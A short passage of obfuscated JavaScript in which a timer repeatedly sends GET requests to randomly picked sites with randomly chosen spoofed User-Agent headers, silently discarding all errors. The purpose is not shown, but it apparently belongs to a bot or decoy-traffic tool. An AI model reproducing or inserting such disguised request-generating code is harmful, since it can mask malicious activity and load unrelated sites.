  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x299b + 0xd6a + -0x1bad * 0x1) * getRandomInt(-0x1 * -0x78e + -0xfd2 * 0x1 + 0x845, 0x1f0a * -0x1 + 0x1774 + 0x21 * 0x3b));
}, -0x1784 + 0x1638 * 0x1 + 0xd8 * 0x2);